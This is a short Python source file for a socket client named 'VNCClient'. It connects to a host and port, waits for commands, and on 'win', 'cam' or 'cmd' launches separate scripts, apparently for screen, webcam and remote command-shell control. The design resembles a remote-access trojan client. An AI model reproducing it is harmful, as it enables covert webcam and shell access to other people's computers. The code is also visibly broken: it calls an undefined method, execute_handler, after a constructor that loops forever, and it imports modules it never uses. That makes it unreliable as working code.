import pyautogui
import socket
import base64
import subprocess
import json
import time
import os
from lib.host import ipadd


class VNCClient:
    def __init__(self, ip, port):

        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # while True:
        #     try:
        #         #self.client.connect((ip, port))
        self.s.connect((ip, port))
        #     break
        # except:
        #     time.sleep(1)
        #self.s.connect((ip, port))
        # self.data = "Connected"
        while True:
            self.a = self.s.recv(1024)
            self.a = self.a.decode()
            if self.a == 'win':
                print("WIN")
                print(f"command = {self.a}")
                subprocess.call('start win.py', shell=True)
            elif self.a == 'cam':
                print("CAM")
                print(f"command = {self.a}")
                subprocess.call('start cam.py', shell=True)
            elif self.a == 'cmd':
                print("CMD")
                subprocess.call('start cmdc.py', shell=True)
                print(f"command = {self.a}")
            elif self.a == 'cpfl':
                print("CopyFile")
                print(f"command = {self.a}")
            elif self.a == 'X':
                print(f"command = {self.a}")


myclient = VNCClient("localhost", 81)
myclient.execute_handler()
